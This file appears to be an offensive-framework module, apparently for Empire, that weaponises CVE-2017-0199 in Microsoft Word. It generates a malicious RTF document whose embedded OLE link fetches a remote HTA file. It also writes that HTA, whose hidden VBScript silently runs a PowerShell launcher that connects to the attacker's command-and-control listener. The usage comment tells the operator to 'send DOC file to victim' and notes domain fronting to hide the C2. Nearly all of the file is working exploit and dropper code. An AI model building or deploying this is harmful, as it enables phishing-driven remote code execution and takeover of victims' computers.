from lib.common import helpers
import string
import random

class Module:

    def __init__(self, mainMenu, params=[]):

        # metadata info about the module, not modified during runtime
        self.info = {
            'Name': 'Microsoft Office Word Malicious Hta Execution',

            'Author': ['james fitts'],

            'Description': ('This module creates a malicious RTF file that'),

            'Background' : False,

            'OutputExtension' : "",

            'NeedsAdmin' : False,

            'OpsecSafe' : False,

            'Language' : 'python',

            'MinLanguageVersion' : '2.7',

            'Comments': ["Module ported from the Metasploit module (CVE-2017-0199). "
					
						"All the hard work was done by these fine folks: "
						
						"Haifei Li, "
						"ryHanson, "
						"wdormann, "
						"DiderStevens, "
						"vysec, "
						"Nixawk, "
						"sinn3r\r\n\r\n"

						"***Usage: *** Host the HTA file wherever HostURL is, send DOC file to victim.\r\n"
						"We aren't hosting it within Empire to not give away the C2 in cases where "
						"you are Domain Fronting."]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                # The 'Agent' option is the only one that MUST be in a module
                'Description'   :   'Agent to execute on.',
                'Required'      :   True,
                'Value'         :   ''
            },
            'Listener' : {
                'Description'   :   'Listener to use for the payload.',
                'Required'      :   True,
                'Value'         :   ''
            },
						'HostURL' : {
								'Description'   :   'URL that the HTA file is hosted at.',
								'Required'			:		True,
								'Value'					:		''
						},
            'OutputRTF' : {
                'Description'   :   'RTF filename.',
                'Required'      :   True,
                'Value'         :   'empire.doc'
            },
						'OutputHTA' : {
								'Description'		:		'HTA filename.',
								'Required'			:		True,
								'Value'					:		'default.hta'
						},
						'OutputPath' : {
								'Description'		:		'Output path for the files.',
								'Required'			:		True,
								'Value'					:		'/tmp/'
						}
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        # During instantiation, any settable option parameters
        #   are passed as an object set to the module and the
        #   options dictionary is automatically set. This is mostly
        #   in case options are passed on the command line
        if params:
            for param in params:
                # parameter format is [Name, Value]
                option, value = param
                if option in self.options:
                    self.options[option]['Value'] = value

    def generate(self, obfuscate=False, obfuscationCommand=""):

			listener = self.options['Listener']['Value']
			rtf_name = self.options['OutputRTF']['Value']
			hta_name = self.options['OutputHTA']['Value']
			host_url = self.options['HostURL']['Value']
			output_path = self.options['OutputPath']['Value']

			if not self.mainMenu.listeners.is_listener_valid(listener):
				print helpers.color("[!] Invalide listener: " + listener)
				return ""
			else:
				launcher = self.mainMenu.stagers.generate_launcher(listener, language='powershell', encode=True)

			def rand_text_alphaupper(size=15, chars=string.ascii_uppercase):
				return ''.join(random.choice(chars) for _ in range(size))

			def generate_uri(url, hta):
				uri_maxlen = 112
				final = []

				if url.count(":") != 2:
					print helpers.color("[!] Please specify a port with your 'HostURL'...")
					print helpers.color("[!] Example: http://192.168.1.1:80")
					return

				if url[-1] != "/":
					url = url + "/" + hta
				else:
					url = url + hta

				for x in url:
					final.append(str(hex(ord(x)) + "00"))

				blob = "".join(final).replace("0x", "")[:-2]

				if len(blob) > (uri_maxlen * 2):
					print helpers.color("[-] URI length is too long...")
					return
				else:
					padding_length = uri_maxlen * 2 - len(blob)
					blob = blob + "0" * padding_length
					return blob

			def create_rtf(outdir, fname, url, hta):
				rtf_data = """{\\rtf1\\adeflang1025\\ansi\\ansicpg1252\uc1\\adeff31507\\deff0\\stshfdbch31505\\stshfloch31506\\stshfhich31506\\stshfbi31507\\deflang1033\\deflangfe2052\\themelang1033\\themelangfe2052\\themelangcs0
{\info
{\\author Microsoft}
{\\operator Microsoft}
}
{\*\\xmlnstbl {\\xmlns1 http://schemas.microsoft.com/office/word/2003/wordml}}
{
{\\object\\objautlink\objupdate\\rsltpict\\objw291\\objh230\\objscalex99\\objscaley101
{\*\\objclass Word.Document.8}
{\*\\objdata 0105000002000000
090000004f4c45324c696e6b000000000000000000000a0000
d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff0900060000000000000000000000010000000100000000000000001000000200000001000000feffffff0000000000000000ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
fffffffffffffffffdfffffffefffffffefffffffeffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffff52006f006f007400200045006e00740072007900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000016000500ffffffffffffffff020000000003000000000000c000000000000046000000000000000000000000704d
6ca637b5d20103000000000200000000000001004f006c00650000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a000200ffffffffffffffffffffffff00000000000000000000000000000000000000000000000000000000
000000000000000000000000f00000000000000003004f0062006a0049006e0066006f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000120002010100000003000000ffffffff0000000000000000000000000000000000000000000000000000
0000000000000000000004000000060000000000000003004c0069006e006b0049006e0066006f000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000014000200ffffffffffffffffffffffff000000000000000000000000000000000000000000000000
00000000000000000000000005000000b700000000000000010000000200000003000000fefffffffeffffff0600000007000000feffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
MINISTREAM_DATA
0105000000000000}
{\\result {\\rtlch\\fcs1 \\af31507 \ltrch\\fcs0 \insrsid1979324 }}}}
{\*\datastore }
}
"""
				ole_ministream_data = ""
				ole_ministream_data += "01000002090000000100000000000000" # 00000000: ................
				ole_ministream_data += "0000000000000000a4000000e0c9ea79" # 00000010: ...............y
				ole_ministream_data += "f9bace118c8200aa004ba90b8c000000" # 00000020: .........K......
				ole_ministream_data += generate_uri(url, hta)
				ole_ministream_data += "00000000795881f43b1d7f48af2c825d" # 000000a0: ....yX..;..H.,.]
				ole_ministream_data += "c485276300000000a5ab0000ffffffff" # 000000b0: ..'c............
				ole_ministream_data += "0609020000000000c000000000000046" # 000000c0: ...............F
				ole_ministream_data += "00000000ffffffff0000000000000000" # 000000d0: ................
				ole_ministream_data += "906660a637b5d2010000000000000000" # 000000e0: .f`.7...........
				ole_ministream_data += "00000000000000000000000000000000" # 000000f0: ................
				ole_ministream_data += "100203000d0000000000000000000000" # 00000100: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000110: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000120: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000130: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000140: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000150: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000160: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000170: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000180: ................
				ole_ministream_data += "00000000000000000000000000000000" # 00000190: ................
				ole_ministream_data += "00000000000000000000000000000000" # 000001a0: ................
				ole_ministream_data += "00000000000000000000000000000000" # 000001b0: ................
				ole_ministream_data += "00000000000000000000000000000000" # 000001c0: ................
				ole_ministream_data += "00000000000000000000000000000000" # 000001d0: ................
				ole_ministream_data += "00000000000000000000000000000000" # 000001e0: ................
				ole_ministream_data += "00000000000000000000000000000000" # 000001f0: ................

				rtf_data = rtf_data.replace("MINISTREAM_DATA", ole_ministream_data)

				full_path = outdir + fname
				f = open(full_path, 'w')
				f.write(rtf_data)

			def create_hta(outdir, fname, oneliner):
				hta_data = """<script language="VBScript">
  window.moveTo -4000, -4000
  Set RANDOM1 = CreateObject("Wscript.Shell")
  Set RANDOM2 = CreateObject("Scripting.FileSystemObject")
  For each path in Split(RANDOM1.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If RANDOM2.FileExists(path + "\..\powershell.exe") Then
      RANDOM1.Run "POWERSHELL_ONE_LINER",0
      Exit For
    End If
  Next
  window.close()
</script>
"""

				hta_data = hta_data.replace("RANDOM1", rand_text_alphaupper(8))
				hta_data = hta_data.replace("RANDOM2", rand_text_alphaupper(8))
				hta_data = hta_data.replace("POWERSHELL_ONE_LINER", oneliner)

				full_path = outdir + fname
				f = open(full_path, 'w')
				f.write(hta_data)


			create_rtf(output_path, rtf_name, host_url, hta_name)
			create_hta(output_path, hta_name, launcher)
			print helpers.color("[+] '%s' and '%s' are created in the '%s' directory" % (rtf_name, hta_name, output_path))

			# very hacky to avoid 'no script returned' message
			return "import sys"
